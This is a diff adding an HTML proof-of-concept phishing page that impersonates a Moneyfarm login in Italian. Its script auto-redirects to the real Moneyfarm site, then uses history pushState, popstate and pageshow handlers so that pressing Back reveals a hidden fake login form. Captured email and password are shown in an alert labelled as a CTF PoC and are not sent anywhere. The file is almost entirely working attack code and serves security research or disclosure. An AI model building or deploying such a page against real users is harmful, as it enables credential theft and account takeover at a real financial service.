@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Accedi | Moneyfarm - PoC open redirect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* Stili principali */
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: "Inter", Helvetica, Arial, sans-serif;
+            background-color: #f8f9fa;
+            color: #212529;
+        }
+        * { box-sizing: border-box; }
+        .poc-header {
+            background-color: #fff;
+            padding: 15px 30px;
+            border-bottom: 1px solid #dee2e6;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .poc-main-section {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px 20px;
+            min-height: calc(100vh - 150px);
+        }
+        .poc-login-box {
+            background-color: #fff;
+            padding: 30px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 420px;
+        }
+        .poc-login-box h2 {
+            font-size: 24px;
+            color: #320327;
+            margin-top: 0;
+            margin-bottom: 8px;
+            font-weight: 600;
+            text-align: center;
+        }
+        .poc-input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        .poc-input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .poc-input-group input[type="email"],
+        .poc-input-group input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #CED4DA;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .poc-submit-btn {
+            background-color: #E11F5E;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+<div>
+
+<a id="forward" href="https://app.moneyfarm.com/gb/product/share-investing/isa"></a>
+
+<div id="phish" style="display:none;" class="container">
+    <header class="poc-header">
+        <h1>Moneyfarm poc - open redirect to ato</h1>
+    </header>
+
+    <main class="poc-main-section">
+        <div class="poc-login-box">
+            <h2>Accedi di nuovo al tuo account</h2>
+            <form id="fakeLoginForm">
+                <div class="poc-input-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="poc-input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <div>
+                    <button type="submit" class="poc-submit-btn">Accedi</button>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer class="poc-footer">
+        <p>&copy; 2025 Moneyfarm - PoC di sicurezza</p>
+    </footer>
+</div>
+</div>
+    <script>
+        document.getElementById("fakeLoginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            alert("PoC CTF - Credenziali catturate:\n\nEmail: " + email + "\nPassword: " + password);
+        });
+    </script>
+    <script>
+function hide(id) {
+    let el = document.getElementById(id);
+    if (el) el.style.display = 'none';
+}
+
+function show(id) {
+    let el = document.getElementById(id);
+    if (el) el.style.display = 'block';
+}
+
+window.addEventListener("load", function () {
+    history.pushState({ phishing: false }, "", location.href);
+    hide("phish");
+    show("forward");
+});
+
+window.addEventListener("popstate", function (event) {
+    if (event.state && event.state.phishing === false) {
+        console.log("Back button detected - Showing phishing page");
+        hide("forward");
+        show("phish");
+    }
+});
+
+window.addEventListener("pageshow", function (event) {
+    if (event.persisted) {
+        console.log("Page loaded from cache - Showing phishing page");
+        hide("forward");
+        show("phish");
+    }
+});
+
+window.addEventListener("DOMContentLoaded", function () {
+    setTimeout(() => {
+        let link = document.getElementById("forward");
+        if (link) {
+            try {
+                link.click();
+            } catch (e) {
+                console.warn("Click automatico bloccato dal browser");
+            }
+        }
+    }, 500);
+});
+</script>
+</body>
+</html>
+
